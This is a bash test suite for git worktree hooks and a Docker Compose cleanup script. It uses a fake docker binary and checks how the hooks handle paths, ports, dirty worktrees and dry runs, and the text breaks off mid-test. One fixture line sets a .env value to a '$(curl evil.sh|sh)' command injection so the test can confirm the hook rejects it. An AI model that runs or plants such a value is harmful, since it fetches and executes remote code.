#!/usr/bin/env bash
# Worktree hook tests
# shellcheck shell=bash

WORKTREE_LIB="${HOME}/.claude/hooks/worktree-lib.sh"
WORKTREE_CREATE="${HOME}/.claude/hooks/create-worktree.sh"
WORKTREE_REMOVE="${HOME}/.claude/hooks/remove-worktree.sh"
WORKTREE_CLEANUP="${HOME}/.claude/hooks/cleanup-worktree.sh"

test_worktree_lib() {
  section "Worktree Hook Library"

  if [ ! -f "$WORKTREE_LIB" ]; then
    skip "worktree-lib.sh not installed"
    return
  fi

  if ! command -v jq &>/dev/null; then
    skip "jq not installed (required by worktree hooks)"
    return
  fi

  # Run each assertion in its own subshell so sourced functions don't leak
  # into the test runner. Capture results and do pass/fail in the parent so
  # the counters update correctly.
  local result

  # ---- parse_cwd ----
  # shellcheck source=/dev/null
  result=$(source "$WORKTREE_LIB" && parse_cwd '{"cwd":"/tmp/sample","other":"x"}')
  if [ "$result" = "/tmp/sample" ]; then
    pass "parse_cwd extracts cwd from JSON"
  else
    fail "parse_cwd returned wrong value: '$result'"
  fi

  # shellcheck source=/dev/null
  result=$(source "$WORKTREE_LIB" && parse_cwd '{"other":"x"}')
  if [ -z "$result" ]; then
    pass "parse_cwd returns empty when cwd missing"
  else
    fail "parse_cwd should return empty: '$result'"
  fi

  # ---- is_worktree ----
  # shellcheck source=/dev/null
  if (source "$WORKTREE_LIB" && ! is_worktree /tmp); then
    pass "is_worktree returns false for non-worktree dir"
  else
    fail "is_worktree returned true for /tmp"
  fi

  # ---- Helpers that operate on a fixture dir ----
  local fixture
  fixture=$(mktemp -d -t worktree-lib-test.XXXXXX)
  cleanup_lib_fixture() {
    [ -n "${fixture:-}" ] && [ -d "$fixture" ] && rm -rf -- "$fixture"
  }
  trap cleanup_lib_fixture EXIT

  # read_base_ports: parses commented and uncommented lines, ignores others
  cat >"$fixture/.env.example" <<'EOF'
# Host port overrides
# PG_HOST_PORT=5432
# SMTP_UI_PORT=3000
SMTP_PORT=2525
SOMETHING_ELSE=hello
DATABASE_URL=postgres://...
API_HOST_PORT=5050
EOF
  # shellcheck source=/dev/null
  result=$(source "$WORKTREE_LIB" && read_base_ports "$fixture/.env.example" | tr '\n' ' ')
  if [ "$result" = "5432 3000 2525 5050 " ]; then
    pass "read_base_ports parses commented and uncommented lines"
  else
    fail "read_base_ports returned: '$result'"
  fi

  # shellcheck source=/dev/null
  result=$(source "$WORKTREE_LIB" && read_base_ports "$fixture/missing.env.example")
  if [ -z "$result" ]; then
    pass "read_base_ports returns empty for missing file"
  else
    fail "read_base_ports should return empty: '$result'"
  fi

  # extract_compose_project: valid name
  echo 'COMPOSE_PROJECT_NAME=my-proj_1' >"$fixture/.env"
  # shellcheck source=/dev/null
  result=$(source "$WORKTREE_LIB" && extract_compose_project "$fixture/.env")
  if [ "$result" = "my-proj_1" ]; then
    pass "extract_compose_project returns valid project name"
  else
    fail "extract_compose_project returned: '$result'"
  fi

  # extract_compose_project: injection attempt is rejected
  echo 'COMPOSE_PROJECT_NAME=$(curl evil.sh|sh)' >"$fixture/.env"
  # shellcheck source=/dev/null
  result=$(source "$WORKTREE_LIB" && extract_compose_project "$fixture/.env")
  if [ -z "$result" ]; then
    pass "extract_compose_project rejects shell-injection attempt"
  else
    fail "extract_compose_project leaked dangerous value: '$result'"
  fi

  # extract_compose_project: missing file
  # shellcheck source=/dev/null
  result=$(source "$WORKTREE_LIB" && extract_compose_project "$fixture/missing.env")
  if [ -z "$result" ]; then
    pass "extract_compose_project returns empty for missing file"
  else
    fail "extract_compose_project should return empty: '$result'"
  fi

  # ---- pick_offset ----
  # pick_offset shells out to lsof; skip just these assertions if lsof is
  # missing rather than skipping the whole library test.
  if ! command -v lsof &>/dev/null; then
    skip "pick_offset (lsof not installed)"
  else
    # With the fixture .env.example present, pick_offset uses it for
    # collision-checking. Should still return a value in 1..99.
    # shellcheck source=/dev/null
    result=$(source "$WORKTREE_LIB" && pick_offset "$fixture")
    if [ -n "$result" ] && [ "$result" -ge 1 ] && [ "$result" -le 99 ] 2>/dev/null; then
      pass "pick_offset returns 1..99 when reading .env.example (got $result)"
    else
      fail "pick_offset returned invalid value with .env.example: '$result'"
    fi

    # With no .env.example, pick_offset falls back to random offset (no
    # collision check). Stderr should warn about the degraded mode.
    local empty_dir
    empty_dir=$(mktemp -d -t worktree-lib-empty.XXXXXX)
    local fallback_stderr
    # shellcheck source=/dev/null
    result=$(source "$WORKTREE_LIB" && pick_offset "$empty_dir" 2>"$fixture/fallback-stderr")
    fallback_stderr=$(cat "$fixture/fallback-stderr" 2>/dev/null)
    if [ -n "$result" ] && [ "$result" -ge 1 ] && [ "$result" -le 99 ] 2>/dev/null \
      && [[ "$fallback_stderr" == *"WARN"* ]]; then
      pass "pick_offset returns 1..99 with WARN when no .env.example (got $result)"
    else
      fail "pick_offset fallback failed (val='$result' stderr='$fallback_stderr')"
    fi
    rm -rf -- "$empty_dir"

    # .env.example exists but declares no ports — same fallback path.
    local no_ports_dir
    no_ports_dir=$(mktemp -d -t worktree-lib-noports.XXXXXX)
    cat >"$no_ports_dir/.env.example" <<'EOF'
DATABASE_URL=postgres://...
SOMETHING=else
EOF
    # shellcheck source=/dev/null
    result=$(source "$WORKTREE_LIB" && pick_offset "$no_ports_dir" 2>/dev/null)
    if [ -n "$result" ] && [ "$result" -ge 1 ] && [ "$result" -le 99 ] 2>/dev/null; then
      pass "pick_offset returns 1..99 when .env.example has no ports (got $result)"
    else
      fail "pick_offset failed when .env.example has no ports: '$result'"
    fi
    rm -rf -- "$no_ports_dir"
  fi

  cleanup_lib_fixture
  trap - EXIT
}

test_worktree_e2e() {
  section "Worktree Hook End-to-End"

  if [ ! -f "$WORKTREE_CREATE" ] || [ ! -f "$WORKTREE_REMOVE" ] || [ ! -f "$WORKTREE_LIB" ]; then
    skip "worktree hooks not installed"
    return
  fi

  if ! command -v jq &>/dev/null; then
    skip "jq not installed"
    return
  fi

  local root repo wt_path wt_path_2 reuse_stderr stderr_file

  # Cleanup runs on function exit AND on script abort (set -e). The EXIT
  # trap is cleared at the bottom of the function so it doesn't fire later.
  # Install the trap BEFORE mktemp so $root never exists without cleanup
  # registered.
  cleanup_e2e() {
    if [ -n "${root:-}" ] && [ -d "$root" ]; then
      if [ -d "$root/repo--main" ] && [ -f "$repo/.git" ]; then
        GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_SYSTEM=/dev/null \
          git -C "$repo" worktree remove --force "$root/repo--main" 2>/dev/null || true
      fi
      rm -rf -- "$root"
    fi
  }
  trap cleanup_e2e EXIT

  root=$(mktemp -d -t dotfiles-wt-test.XXXXXX)
  repo="$root/repo"

  # Isolate the test repo from the user's global git config (signing,
  # core.hooksPath, init.templateDir, commit.template, etc.) so the test
  # is deterministic across machines.
  GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_SYSTEM=/dev/null \
    git init --quiet --initial-branch=main "$repo"
  GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_SYSTEM=/dev/null \
    git -C "$repo" \
    -c user.email=test@example.invalid \
    -c user.name=Test \
    commit --allow-empty -m "init" --quiet

  # ---- Create path ----
  wt_path=$(printf '{"cwd":"%s"}' "$repo" | "$WORKTREE_CREATE" 2>/dev/null)

  if [ -z "$wt_path" ] || [ ! -d "$wt_path" ] || [ ! -f "$wt_path/.git" ]; then
    fail "create-worktree.sh did not produce a valid worktree (got: '$wt_path')"
    cleanup_e2e
    trap - EXIT
    return
  fi
  pass "create-worktree.sh created worktree at $(basename "$wt_path")"

  # ---- Reuse path ----
  # Second invocation should detect the existing worktree dir and take the
  # reuse branch, returning the same path with a log mentioning that path
  # on stderr. Capture stderr to a file inside $root so the EXIT trap
  # cleans it up automatically.
  stderr_file="$root/reuse-stderr"
  wt_path_2=$(printf '{"cwd":"%s"}' "$repo" | "$WORKTREE_CREATE" 2>"$stderr_file")
  reuse_stderr=$(cat "$stderr_file" 2>/dev/null)

  if [ "$wt_path_2" = "$wt_path" ] && [[ "$reuse_stderr" == *"$wt_path"* ]]; then
    pass "create-worktree.sh reuses existing worktree on second invocation"
  else
    fail "expected reuse branch (path='$wt_path_2' stderr='$reuse_stderr')"
  fi

  # ---- Defensive paths ----
  # create-worktree.sh should reject a nonexistent cwd with non-zero exit
  # AND emit an ERROR on stderr so a developer can debug it.
  local bogus="$root/does-not-exist"
  local create_stderr create_rc
  printf '{"cwd":"%s"}' "$bogus" | "$WORKTREE_CREATE" >/dev/null 2>"$root/create-stderr" \
    && create_rc=0 || create_rc=$?
  create_stderr=$(cat "$root/create-stderr" 2>/dev/null)
  if [ "$create_rc" -ne 0 ] && [[ "$create_stderr" == *"ERROR"* ]]; then
    pass "create-worktree.sh rejects nonexistent cwd with ERROR"
  else
    fail "create-worktree.sh defensive path failed (rc=$create_rc stderr='$create_stderr')"
  fi

  # remove-worktree.sh should warn and exit 0 (no-op) on nonexistent cwd —
  # it must not return success after deleting nothing AND must not error
  # the caller's hook chain.
  local rm_stderr
  printf '{"cwd":"%s"}' "$bogus" | "$WORKTREE_REMOVE" 2>"$root/rm-stderr" >/dev/null
  rm_stderr=$(cat "$root/rm-stderr" 2>/dev/null)
  if [[ "$rm_stderr" == *"WARNING"* ]]; then
    pass "remove-worktree.sh warns on nonexistent cwd"
  else
    fail "remove-worktree.sh missing WARNING for nonexistent cwd: '$rm_stderr'"
  fi

  # Canonicalization: a cwd containing `..` resolves the real path. Feed
  # "$repo/.." which canonicalizes to "$root". The test asserts that
  # create-worktree.sh fails (because $root isn't a git repo) — proving
  # the hook landed at the resolved parent rather than re-using "$repo"'s
  # repo state.
  #
  # Precondition: $root must NOT be inside a git tree, otherwise the test
  # would pass for the wrong reason. mktemp on macOS (/var/folders/...)
  # and Linux (/tmp) is reliably outside a tree, but assert it explicitly.
  if git -C "$root" rev-parse --is-inside-work-tree >/dev/null 2>&1; then
    skip "canonicalization test (mktemp root is inside a git tree)"
  else
    local traversal_stderr traversal_rc
    printf '{"cwd":"%s/.."}' "$repo" | "$WORKTREE_CREATE" >/dev/null 2>"$root/traversal-stderr" \
      && traversal_rc=0 || traversal_rc=$?
    traversal_stderr=$(cat "$root/traversal-stderr" 2>/dev/null)
    if [ "$traversal_rc" -ne 0 ] && [[ "$traversal_stderr" == *"is not a git work tree"* ]]; then
      pass "create-worktree.sh canonical cwd is not a git repo => fails via precheck (does not escape to $repo)"
    else
      fail "create-worktree.sh should reject traversal cwd at precheck (rc=$traversal_rc, stderr='$traversal_stderr')"
    fi
  fi

  # ---- Remove path (via the hook script, not teardown_worktree directly) ----
  # remove-worktree.sh reads JSON from stdin and exercises parse_cwd +
  # is_worktree + teardown_worktree end-to-end.
  printf '{"cwd":"%s"}' "$wt_path" | "$WORKTREE_REMOVE" 2>/dev/null

  if [ ! -d "$wt_path" ]; then
    pass "remove-worktree.sh removed the worktree"
  else
    fail "remove-worktree.sh did not remove $wt_path"
  fi

  cleanup_e2e
  trap - EXIT
}

test_worktree_teardown() {
  section "Worktree Teardown"

  if [ ! -f "$WORKTREE_CLEANUP" ] || [ ! -f "$WORKTREE_REMOVE" ] || [ ! -f "$WORKTREE_LIB" ]; then
    skip "worktree hooks not installed"
    return
  fi

  local root repo bin log rc out stdout wt

  cleanup_teardown() {
    [ -n "${root:-}" ] && [ -d "$root" ] && rm -rf -- "$root"
  }
  trap cleanup_teardown EXIT

  root=$(mktemp -d -t dotfiles-wt-teardown.XXXXXX)
  # The space checks that every path expansion is quoted.
  repo="$root/repo dir"
  bin="$root/bin"
  log="$root/docker.log"

  # A fake docker records each call and returns scripted output, so these
  # tests run on machines without Docker, CI included.
  mkdir -p "$bin"
  # FAKE_DOCKER_CONTAINERS holds "<project><TAB><working dir>" lines.
  # FAKE_DOCKER_VOLUMES holds "<project> <volume>" lines and
  # FAKE_DOCKER_IMAGES "<project> <id> <repository> <service>" lines.
  # A --filter on a project label limits every reply to that project.
  # `docker images` replies the id; `docker image inspect <id>...` replies
  # "<service> <repository>:latest" for each id.
  cat >"$bin/docker" <<'FAKE'
#!/usr/bin/env bash
echo "$* [cwd=$PWD]" >>"$FAKE_DOCKER_LOG"
project="" prev=""
for arg in "$@"; do
  [ "$prev" = --filter ] && project="${arg#label=com.docker.compose.project=}"
  prev="$arg"
done
rows() { printf '%s\n' "$1" | awk -v p="$project" 'NF && $1 == p { print $2 }'; }
case "$1" in
  info) [ "${FAKE_DOCKER_DAEMON:-up}" = up ] || exit 1 ;;
  ps)
    [ "${FAKE_DOCKER_PS_RC:-0}" -eq 0 ] || exit "$FAKE_DOCKER_PS_RC"
    if [ -n "$project" ]; then
      printf '%s\n' "${FAKE_DOCKER_CONTAINERS:-}" | awk -F'\t' -v p="$project" '$1 == p { print "id" NR }'
    elif [ -n "${FAKE_DOCKER_CONTAINERS:-}" ]; then
      printf '%s\n' "$FAKE_DOCKER_CONTAINERS"
    fi
    ;;
  volume)
    [ "${FAKE_DOCKER_LS_RC:-0}" -eq 0 ] || exit "$FAKE_DOCKER_LS_RC"
    rows "${FAKE_DOCKER_VOLUMES:-}"
    ;;
  images)
    [ "${FAKE_DOCKER_LS_RC:-0}" -eq 0 ] || exit "$FAKE_DOCKER_LS_RC"
    rows "${FAKE_DOCKER_IMAGES:-}"
    ;;
  image)
    # image inspect --format <template> <id>...
    shift 3
    for id in "$@"; do
      printf '%s\n' "${FAKE_DOCKER_IMAGES:-}" | awk -v id="$id" 'NF && $2 == id { print $4, $3 ":latest"; exit }'
    done
    ;;
  compose)
    case " $* " in
      *" down "*) exit "${FAKE_DOCKER_DOWN_RC:-0}" ;;
    esac
    ;;
esac
exit 0
FAKE
  chmod +x "$bin/docker"

  # Isolate git from the user's global config, as the e2e test does.
  tgit() { GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_SYSTEM=/dev/null git "$@"; }

  # The repo tracks a compose file and ignores .env, like a real project.
  tgit init --quiet --initial-branch=main "$repo"
  printf 'services: {}\n' >"$repo/compose.yaml"
  printf '.env\n' >"$repo/.gitignore"
  tgit -C "$repo" add compose.yaml .gitignore
  tgit -C "$repo" -c user.email=test@example.invalid -c user.name=Test \
    commit -m "init" --quiet

  # make_wt <name>: a worktree on branch <name> with project wt-<name>.
  # Sets $own to a FAKE_DOCKER_CONTAINERS line for a container of that
  # project started from the worktree.
  make_wt() {
    wt="$repo--$1"
    tgit -C "$repo" worktree add --quiet -b "$1" "$wt" main
    echo "COMPOSE_PROJECT_NAME=wt-$1" >"$wt/.env"
    own="wt-$1	$wt"
  }

  # run_hook <script> [args...]: runs a hook from RUN_DIR (default: the
  # current folder) with PATH set to TEST_PATH (default: the fake docker
  # first, then the real PATH). Sets rc, out to the hook's stderr, and
  # stdout to its stdout. FAKE_DOCKER_* set the fake's replies.
  run_hook() {
    : >"$log"
    (
      cd "${RUN_DIR:-.}" \
        && PATH="${TEST_PATH:-$bin:$PATH}" FAKE_DOCKER_LOG="$log" \
          GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_SYSTEM=/dev/null "$@"
    ) >"$root/stdout" 2>"$root/stderr" && rc=0 || rc=$?
    out=$(cat "$root/stderr")
    stdout=$(cat "$root/stdout")
  }

  # ---- Projects whose containers came from the worktree go, whatever their name ----
  # Arrange
  make_wt byfolder
  # Act
  FAKE_DOCKER_CONTAINERS="$own
any-name-test	$wt/sub dir
any-name-test	$wt" run_hook "$WORKTREE_CLEANUP" "$wt"
  # Assert
  if [ "$rc" -eq 0 ] && [ ! -d "$wt" ] \
    && grep -q -- "compose -p wt-byfolder down -v --rmi local --remove-orphans \[cwd=/\]" "$log" \
    && grep -q -- "compose -p any-name-test down -v --rmi local --remove-orphans \[cwd=/\]" "$log" \
    && ! grep -q -- "-e2e" "$log"; then
    pass "cleanup-worktree.sh runs compose down from / for every project started from the worktree, and guesses no -e2e name"
  else
    fail "folder-matched teardown (rc=$rc stderr='$out' log='$(cat "$log")')"
  fi

  # ---- The resolved spelling of the folder matches too ----
  # Arrange
  make_wt resolved
  # Act
  FAKE_DOCKER_CONTAINERS="wt-resolved	$(cd "$wt" && pwd -P)" run_hook "$WORKTREE_CLEANUP" "$wt"
  # Assert
  if [ "$rc" -eq 0 ] && grep -q -- "compose -p wt-resolved down " "$log"; then
    pass "cleanup-worktree.sh matches a container that recorded the worktree's resolved path"
  else
    fail "resolved path match (rc=$rc stderr='$out' log='$(cat "$log")')"
  fi

  # ---- A project with containers from another folder is kept, and named ----
  # Arrange
  make_wt mixed
  # Act
  FAKE_DOCKER_CONTAINERS="shared	$wt
shared	$repo" run_hook "$WORKTREE_CLEANUP" "$wt"
  # Assert
  if [ "$rc" -eq 0 ] && [ ! -d "$wt" ] && ! grep -q -- " down " "$log" \
    && [[ "$out" == *"Compose project shared was not removed"* ]]; then
    pass "cleanup-worktree.sh keeps a project that also has another folder's containers, and names it"
  else
    fail "mixed project (rc=$rc stderr='$out' log='$(cat "$log")')"
  fi

  # ---- A sibling worktree whose folder name starts with this one's is not matched ----
  # Arrange
  make_wt sib
  # Act
  FAKE_DOCKER_CONTAINERS="wt-sib2	${wt}2" run_hook "$WORKTREE_CLEANUP" "$wt"
  # Assert
  if [ "$rc" -eq 0 ] && ! grep -q -- " down " "$log"; then
    pass "cleanup-worktree.sh leaves a project from a folder whose name only starts with the worktree's"
  else
    fail "sibling prefix (rc=$rc stderr='$out' log='$(cat "$log")')"
  fi

  # ---- Run from inside the worktree it removes ----
  # Arrange
  make_wt inside
  # Act
  RUN_DIR="$wt" FAKE_DOCKER_CONTAINERS="$own" run_hook "$WORKTREE_CLEANUP" .
  # Assert
  if [ "$rc" -eq 0 ] && [ ! -d "$wt" ] \
    && grep -q -- "compose -p wt-inside down .*\[cwd=/\]" "$log"; then
    pass "cleanup-worktree.sh removes the worktree it is run from"
  else
    fail "run from inside the worktree (rc=$rc stderr='$out' log='$(cat "$log")')"
  fi

  # ---- Missing path: the error names it ----
  # Act
  (
    set -u
    # shellcheck source=/dev/null
    source "$WORKTREE_LIB" && teardown_worktree "$root/missing"
  ) 2>"$root/stderr" && rc=0 || rc=$?
  out=$(cat "$root/stderr")
  # Assert
  if [ "$rc" -eq 1 ] && [[ "$out" == *"not a directory: $root/missing"* ]]; then
    pass "teardown_worktree names a missing path"
  else
    fail "missing path (rc=$rc stderr='$out')"
  fi

  # ---- Nothing left of the project: no down call ----
  # Arrange
  make_wt empty
  # Act
  run_hook "$WORKTREE_CLEANUP" "$wt"
  # Assert
  if [ "$rc" -eq 0 ] && [ ! -d "$wt" ] && ! grep -q -- " down " "$log"; then
    pass "cleanup-worktree.sh skips docker down when the worktree has no projects"
  else
    fail "empty project teardown (rc=$rc stderr='$out' log='$(cat "$log")')"
  fi

  # ---- Volumes or images left without containers, under the .env name: torn down ----
  # Arrange
  make_wt orphan
  # Act
  FAKE_DOCKER_VOLUMES="wt-orphan data" run_hook "$WORKTREE_CLEANUP" "$wt"
  # Assert
  if [ "$rc" -eq 0 ] && [ ! -d "$wt" ] \
    && grep -q -- "volume ls -q --filter label=com.docker.compose.project=wt-orphan " "$log" \
    && grep -q -- "compose -p wt-orphan down -v --rmi local --remove-orphans" "$log"; then
    pass "cleanup-worktree.sh tears down the .env project when only its volumes are left"
  else
    fail "volume-only teardown (rc=$rc stderr='$out' log='$(cat "$log")')"
  fi

  # Arrange
  make_wt orphimg
  # Act
  FAKE_DOCKER_IMAGES="wt-orphimg sha256abc wt-orphimg-app app" run_hook "$WORKTREE_CLEANUP" "$wt"
  # Assert
  if [ "$rc" -eq 0 ] && [ ! -d "$wt" ] \
    && grep -q -- "images -q --filter label=com.docker.compose.project=wt-orphimg " "$log" \
    && grep -q -- "compose -p wt-orphimg down -v --rmi local --remove-orphans" "$log"; then
    pass "cleanup-worktree.sh tears down the .env project when only its images are left"
  else
    fail "image-only teardown (rc=$rc stderr='$out' log='$(cat "$log")')"
  fi

  # ---- Leftovers under a guessed -e2e name are left for /wrap ----
  # Arrange
  make_wt e2eonly
  # Act
  FAKE_DOCKER_VOLUMES="wt-e2eonly-e2e data" run_hook "$WORKTREE_CLEANUP" "$wt"
  # Assert
  if [ "$rc" -eq 0 ] && [ ! -d "$wt" ] && ! grep -q -- " down " "$log"; then
    pass "cleanup-worktree.sh does not guess a -e2e project for leftover volumes"
  else
    fail "e2e-only leftovers (rc=$rc stderr='$out' log='$(cat "$log")')"
  fi

  # ---- .env name whose containers run elsewhere: kept ----
  # Arrange
  make_wt busy
  # Act
  FAKE_DOCKER_CONTAINERS="wt-busy	$root/elsewhere" FAKE_DOCKER_VOLUMES="wt-busy data" \
    run_hook "$WORKTREE_CLEANUP" "$wt"
  # Assert
  if [ "$rc" -eq 0 ] && [ ! -d "$wt" ] && ! grep -q -- " down " "$log"; then
    pass "cleanup-worktree.sh keeps the .env project when its containers came from another folder"
  else
    fail "env project with outside containers (rc=$rc stderr='$out' log='$(cat "$log")')"
  fi

  # ---- .env carrying the main checkout's project name: its volumes are kept ----
  # Arrange
  make_wt mainname
  # compose derives "repodir" from the main checkout's folder, "repo dir".
  echo "COMPOSE_PROJECT_NAME=repodir" >"$wt/.env"
  # Act
  FAKE_DOCKER_VOLUMES="repodir pgdata" run_hook "$WORKTREE_CLEANUP" "$wt"
  # Assert
  if [ "$rc" -eq 0 ] && [ ! -d "$wt" ] && ! grep -q -- " down " "$log"; then
    pass "cleanup-worktree.sh never removes leftovers under the main checkout's project name"
  else
    fail "main checkout name guard (rc=$rc stderr='$out' log='$(cat "$log")')"
  fi

  # ---- Leftover lookup fails: warn, no down, still remove ----
  # Arrange
  make_wt lsfail
  # Act
  FAKE_DOCKER_LS_RC=1 run_hook "$WORKTREE_CLEANUP" "$wt"
  # Assert
  if [ "$rc" -eq 0 ] && [ ! -d "$wt" ] && ! grep -q -- " down " "$log" \
    && [[ "$out" == *"lookup failed; Compose project wt-lsfail was not removed"* ]]; then
    pass "cleanup-worktree.sh warns, naming the project, when the leftover lookup fails"
  else
    fail "leftover lookup failure (rc=$rc stderr='$out' log='$(cat "$log")')"
  fi

  # ---- Main checkout's project name, all containers from the worktree: kept ----
  # Arrange
  make_wt mainfolder
  # Act
  FAKE_DOCKER_CONTAINERS="repodir	$wt" FAKE_DOCKER_VOLUMES="repodir pgdata" \
    run_hook "$WORKTREE_CLEANUP" "$wt"
  # Assert
  if [ "$rc" -eq 0 ] && [ ! -d "$wt" ] && ! grep -q -- " down " "$log" \
    && [[ "$out" == *"Compose project repodir was not removed: "*" runs a project with the same name"* ]]; then
    pass "cleanup-worktree.sh keeps a project started from the worktree when it has the main checkout's name"
  else
    fail "main checkout name, started from the worktree (rc=$rc stderr='$out' log='$(cat "$log")')"
  fi

  # ---- Main checkout's top-level compose name: kept ----
  # Arrange
  make_wt mainkey
  printf 'name: custom-main\nservices: {}\n' >"$repo/compose.yaml"
  # Act
  FAKE_DOCKER_CONTAINERS="custom-main	$wt" run_hook "$WORKTREE_CLEANUP" "$wt"
  printf 'services: {}\n' >"$repo/compose.yaml"
  # Assert
  if [ "$rc" -eq 0 ] && ! grep -q -- " down " "$log" \
    && [[ "$out" == *"Compose project custom-main was not removed"* ]]; then
    pass "cleanup-worktree.sh reads the main checkout's top-level compose name"
  else
    fail "main checkout name: key (rc=$rc stderr='$out' log='$(cat "$log")')"
  fi

  # ---- Subfolder project another checkout also has: kept; one only this worktree has: removed ----
  # Arrange
  make_wt subdir
  mkdir -p "$repo/infra"
  # compose names both from their folder: "infra" and "only-here".
  # Act
  FAKE_DOCKER_CONTAINERS="infra	$wt/infra
only-here	$wt/only-here" run_hook "$WORKTREE_CLEANUP" "$wt"
  rmdir "$repo/infra"
  # Assert
  if [ "$rc" -eq 0 ] && ! grep -q -- "compose -p infra down " "$log" \
    && grep -q -- "compose -p only-here down " "$log" \
    && [[ "$out" == *"Compose project infra was not removed: "*" runs a project with the same name"* ]]; then
    pass "cleanup-worktree.sh keeps a subfolder project whose name another checkout also derives"
  else
    fail "subfolder project names (rc=$rc stderr='$out' log='$(cat "$log")')"
  fi

  # ---- Dry run: prints what would go, changes nothing ----
  # Arrange
  make_wt dry
  # img1 appears twice in the lookup and counts once. img3 is named with
  # `image:`, which `down --rmi local` keeps, so it isn't counted.
  # Act
  FAKE_DOCKER_CONTAINERS="$own
shared	$wt
shared	$repo" FAKE_DOCKER_VOLUMES="wt-dry pgdata
wt-dry cache" FAKE_DOCKER_IMAGES="wt-dry img1 wt-dry-app app
wt-dry img1 wt-dry-app app
wt-dry img2 wt-dry-worker worker
wt-dry img3 example/tagged api" run_hook "$WORKTREE_CLEANUP" --dry-run "$wt"
  # Assert
  if [ "$rc" -eq 0 ] && [ -d "$wt" ] && ! grep -q -- " down " "$log" \
    && [[ "$stdout" == *"remove wt-dry: volumes cache pgdata; images 2"* ]] \
    && [[ "$stdout" == *"keep shared: it also has containers from other folders"* ]] \
    && [[ "$stdout" != *"Done."* ]]; then
    pass "cleanup-worktree.sh --dry-run lists projects, volumes and built-image count, and removes nothing"
  else
    fail "dry run (rc=$rc stdout='$stdout' stderr='$out' log='$(cat "$log")')"
  fi
  tgit -C "$repo" worktree remove --force "$wt"

  # ---- Dry run lists a leftover project under the .env name ----
  # Arrange
  make_wt dryleft
  # Act
  FAKE_DOCKER_VOLUMES="wt-dryleft pgdata" run_hook "$WORKTREE_CLEANUP" --dry-run "$wt"
  # Assert
  if [ "$rc" -eq 0 ] && [ -d "$wt" ] && ! grep -q -- " down " "$log" \
    && [[ "$stdout" == "remove wt-dryleft: volumes pgdata; images 0" ]]; then
    pass "cleanup-worktree.sh --dry-run lists the .env project when only its volumes are left"
  else
    fail "dry run leftovers (rc=$rc stdout='$stdout' stderr='$out' log='$(cat "$log")')"
  fi
  tgit -C "$repo" worktree remove --force "$wt"

  # ---- Dry run with a failed lookup says so instead of guessing ----
  # Arrange
  make_wt dryfail
  # Act
  FAKE_DOCKER_CONTAINERS="$own" FAKE_DOCKER_LS_RC=1 run_hook "$WORKTREE_CLEANUP" --dry-run "$wt"
  # Assert
  if [ "$rc" -eq 0 ] && [ -d "$wt" ] \
    && [[ "$stdout" == "remove wt-dryfail: volumes unknown; images unknown" ]] \
    && [[ "$out" == *"lookup failed for Compose project wt-dryfail"* ]]; then
    pass "cleanup-worktree.sh --dry-run reports a failed volume or image lookup as unknown"
  else
    fail "dry run lookup failure (rc=$rc stdout='$stdout' stderr='$out')"
  fi
  tgit -C "$repo" worktree remove --force "$wt"

  # ---- Untracked file without --force: nothing touched ----
  # Arrange
  make_wt untracked
  echo "work in progress" >"$wt/notes.txt"
  # Act
  FAKE_DOCKER_CONTAINERS="$own" run_hook "$WORKTREE_CLEANUP" "$wt"
  # Assert
  if [ "$rc" -ne 0 ] && [ -d "$wt" ] && [ ! -s "$log" ] \
    && [[ "$out" == *"uncommitted"* ]]; then
    pass "cleanup-worktree.sh keeps a worktree with an untracked file and leaves Docker alone"
  else
    fail "untracked without --force (rc=$rc stderr='$out' log='$(cat "$log")')"
  fi

  # ---- Same worktree with --force: removed ----
  # Act
  FAKE_DOCKER_CONTAINERS="$own" run_hook "$WORKTREE_CLEANUP" --force "$wt"
  # Assert
  if [ "$rc" -eq 0 ] && [ ! -d "$wt" ] \
    && grep -q -- "compose -p wt-untracked down -v --rmi local" "$log"; then
    pass "cleanup-worktree.sh --force removes a dirty worktree and its project"
  else
    fail "dirty with --force (rc=$rc stderr='$out' log='$(cat "$log")')"
  fi

  # ---- Modified tracked file without --force: nothing touched ----
  # Arrange
  make_wt modified
  echo "# edited" >>"$wt/compose.yaml"
  # Act
  FAKE_DOCKER_CONTAINERS="$own" run_hook "$WORKTREE_CLEANUP" "$wt"
  # Assert
  if [ "$rc" -ne 0 ] && [ -d "$wt" ] && [ ! -s "$log" ]; then
    pass "cleanup-worktree.sh keeps a worktree with a modified tracked file"
  else
    fail "modified without --force (rc=$rc stderr='$out' log='$(cat "$log")')"
  fi
  tgit -C "$repo" worktree remove --force "$wt"

  # ---- Locked worktree: git refuses before Docker is touched ----
  # Arrange
  make_wt locked
  tgit -C "$repo" worktree lock "$wt"
  # Act
  FAKE_DOCKER_CONTAINERS="$own" run_hook "$WORKTREE_CLEANUP" "$wt"
  # Assert
  if [ "$rc" -ne 0 ] && [ -d "$wt" ] && ! grep -q -- " down " "$log"; then
    pass "cleanup-worktree.sh keeps a locked worktree and its Docker project"
  else
    fail "locked worktree (rc=$rc stderr='$out' log='$(cat "$log")')"
  fi
  tgit -C "$repo" worktree unlock "$wt"
  tgit -C "$repo" worktree remove --force "$wt"

  # ---- Relative path from another folder ----
  # Arrange
  make_wt relative
  # Act
  RUN_DIR="$root" FAKE_DOCKER_CONTAINERS="$own" run_hook "$WORKTREE_CLEANUP" "./repo dir--relative"
  # Assert
  if [ "$rc" -eq 0 ] && [ ! -d "$wt" ]; then
    pass "cleanup-worktree.sh removes a worktree given by a relative path"
  else
    fail "relative path (rc=$rc stderr='$out')"
  fi

  # ---- docker down fails: worktree removed, every project still tried, errors name each ----
  # Arrange
  make_wt downfail
  # Act
  FAKE_DOCKER_CONTAINERS="$own
wt-downfail-test	$wt" FAKE_DOCKER_DOWN_RC=1 run_hook "$WORKTREE_CLEANUP" "$wt"
  # Assert
  if [ "$rc" -ne 0 ] && [ ! -d "$wt" ] \
    && [[ "$out" == *"down failed for project wt-downfail;"* ]] \
    && [[ "$out" == *"down failed for project wt-downfail-test;"* ]]; then
    pass "cleanup-worktree.sh exits non-zero and names each project when docker compose down fails"
  else
    fail "docker down failure (rc=$rc stderr='$out')"
  fi

  # ---- docker ps fails: warn, still remove ----
  # Arrange
  make_wt psfail
  # Act
  FAKE_DOCKER_PS_RC=1 run_hook "$WORKTREE_CLEANUP" "$wt"
  # Assert
